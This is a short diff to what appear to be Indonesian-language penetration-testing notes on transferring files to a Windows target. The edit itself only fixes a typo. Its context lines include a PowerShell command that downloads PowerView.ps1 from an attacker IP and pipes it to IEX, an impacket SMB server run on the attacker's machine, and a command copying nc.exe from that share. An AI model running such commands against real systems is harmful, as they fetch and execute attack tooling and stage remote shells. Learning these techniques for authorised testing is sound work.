@@ -48,7 +48,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ````
 
 ### Metode 3: SMB download
-- Server SMB di komputeruter attacker
+- Server SMB di komputer attacker
   ```
   sudo impacket-smbserver share -smb2support /tmp/smbshare
   ```
@@ -57,7 +57,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   copy \\<ip>\share\nc.exe
   ```
 - Versi windows baru memblokir akses yang tidak terautentikasi
-- Server SMB di komputeruter attacker:
+- Server SMB di komputer attacker:
   ```
   sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
   ```
